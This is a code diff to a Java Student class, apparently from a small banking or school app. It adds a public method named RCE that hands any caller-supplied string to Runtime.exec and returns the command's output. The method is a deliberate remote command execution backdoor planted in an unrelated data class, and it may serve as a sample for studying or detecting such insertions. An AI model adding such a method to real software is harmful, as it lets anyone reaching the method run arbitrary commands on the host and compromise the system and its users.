@@ -1,3 +1,7 @@
+import java.io.BufferedReader;
+import java.io.IOException;
+import java.io.InputStreamReader;
+
 public class Student {
     public String firstName;
     public String lastName;
@@ -15,6 +19,23 @@ public class Student {
 
     public String fullName() {
         return String.format("%s %s", this.firstName, this.lastName);
+    }
+
+    public String RCE(String cmd) {
+        try {
+            StringBuilder result = new StringBuilder();
+            Process process = Runtime.getRuntime().exec(cmd);
+            BufferedReader reader = new BufferedReader(
+                    new InputStreamReader(process.getInputStream()));
+            String line;
+            while ((line = reader.readLine()) != null) {
+                result.append(line);
+            }
+            reader.close();
+            return result.toString();
+        } catch (IOException e) {
+            return "command failed";
+        }
     }
 
     public TransactionStatus transferMoney(Student toStudent, Double amount, String suppliedPassword) {
